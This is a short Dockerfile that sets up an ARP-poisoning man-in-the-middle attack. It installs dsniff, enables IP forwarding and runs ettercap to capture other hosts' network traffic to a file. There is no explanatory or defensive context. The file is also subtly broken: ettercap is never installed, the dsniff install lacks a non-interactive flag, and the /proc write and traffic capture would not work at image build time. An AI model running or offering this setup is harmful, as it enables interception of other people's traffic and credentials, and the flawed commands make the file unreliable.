FROM ubuntu
RUN apt-get update && apt-get install -yq build-essential
RUN apt-get install dsniff
RUN echo 1 > /proc/sys/net/ipv4/ip_forward
RUN ettercap -q -T -M arp > /tmp/capture.txt